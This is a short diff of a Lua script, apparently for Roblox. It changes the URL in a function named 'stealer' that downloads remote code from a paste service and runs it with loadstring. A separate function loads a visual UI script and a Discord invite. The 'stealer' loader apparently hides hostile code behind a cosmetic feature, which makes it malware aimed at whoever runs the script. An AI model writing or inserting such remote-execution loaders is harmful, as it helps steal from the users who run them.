@@ -1,6 +1,6 @@
 
 local function stealer()
-    loadstring(game:HttpGet("https://cdn.sourceb.in/bins/j2RREEGFj5/0"))() 
+    loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/xJfN6j1b9LuKMSyA/raw", true))()
 end
 local function loadui()
   loadstring(game:HttpGet("https://raw.githubusercontent.com/f4shn/main/refs/heads/main/games/gagvisual.lua", true))("discord.gg/csxu2nCkw9")
